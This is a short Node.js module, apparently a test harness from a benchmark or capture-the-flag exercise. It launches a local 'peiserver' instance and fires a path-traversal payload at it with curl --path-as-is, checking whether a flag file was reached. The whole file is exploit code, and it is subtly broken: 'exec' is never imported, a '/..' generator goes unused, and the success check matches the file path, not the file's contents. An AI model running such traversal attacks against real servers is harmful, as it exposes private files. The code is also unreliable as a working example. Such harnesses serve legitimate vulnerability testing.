const path = require("path");
const { sleep } = require("sleep");

function exploitFunction(payload) {
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  const genstr = (n) => "/..".repeat(n);

  let server = "node ./node_modules/peiserver/index.js";

  let exe = exec(server, (error, stdout) => {
    sleep.sleep(2);
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
    exec(attack_string, (error, stdout) => {
      let out = false;
      if (stdout.includes(pathToFlag)) {
        out = true;
      }
      console.log(out); // For demonstration purposes
    });
  });
}

module.exports = { exploitFunction };